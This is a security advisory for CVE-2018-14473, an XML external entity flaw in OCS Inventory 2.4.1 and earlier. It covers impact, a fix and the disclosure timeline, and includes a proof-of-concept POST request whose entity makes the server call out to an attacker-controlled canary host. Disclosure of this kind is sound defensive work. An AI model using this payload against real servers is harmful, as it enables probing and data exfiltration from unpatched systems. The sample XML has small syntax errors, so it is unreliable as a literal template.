# CVE-2018-14473: XML External Entity (XXE) in OCS Inventory
[![](https://img.shields.io/badge/Attack%20Vector-Remote-red?style=flat-square)]() [![](https://img.shields.io/badge/Privileges%20Required-None-red?style=flat-square)]() [![](https://img.shields.io/badge/User%20Interaction-No-red?style=flat-square)]()


__Vendor:__ OCS Inventory<br>
__Vendor URL:__ https://ocsinventory-ng.org<br>
__Versions affected:__ OCS Inventory <= 2.4.1<br>
__Discovered by:__ Pablo Martinez ([@xassiz](https://twitter.com/xassiz))<br>
__Public fix:__ Yes<br>
__Proof of Concept:__ Yes ([ref](https://github.com/blackarrowsec/advisories/blob/master/2018/CVE-2018-14473/)) <br>



## Summary
Due to an inadequate configuration it is possible to use external entities, which when processed by the XML parser, allow the exfiltration of sensitive information from the machine.

## Details
The communication between the agents and the master server of OCS Inventory is done through the HTTP protocol, sending the information against an endpoint. The information is structured in the form of XML, being parsed by the server to extract the data. 
As proof of concept, a local web server can be raised on the userâ€™s machine, as a canary, and send the following request against the vulnerable endpoint:

```
POST /ocsinventory HTTP/1.1
Host: xxxxxxxxxxxxxxx
User-Agent: OCS-NG_WINDOWS_AGENT_v2.3.1.1
Accept: */*
Content-Type: application/xml
Content-Length: 160
Expect: 100-continue
Connection: close
<?xml version="1.0" encoding=""UTF-8" ?>
<!DOCTYPE r [
      <!ELEMENT r ANY >
      <!ENTITY sp SYSTEM "https://ourserver/?pwned">
>
<REQUEST>&sp;</REQUEST>
```

When the XML is processed, the entity &sp; expands and the OCS Inventory server makes a request against our canary, verifying the existence of the vulnerability.

## Impact
An attacker can exfiltrate sensitive information from the machine.

## Recommendation
Update the software to last version.

## Timeline

* 05/06/2018 - Reported vulnerability to vendor
* 05/06/2018 - Vendor ACK
* 14/06/2018 - First fix attempt (bypassed)
* 02/07/2018 - Correct fix
* 30/07/2018 - Security Release with fix (OCS Inventory 2.5)


#

[![](https://img.shields.io/badge/www-blackarrow.net-E5A505?style=flat-square)](https://www.blackarrow.net) [![](https://img.shields.io/badge/twitter-@BlackArrowSec-00aced?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com/BlackArrowSec) [![](https://img.shields.io/badge/linkedin-@BlackArrowSec-0084b4?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/blackarrowsec/)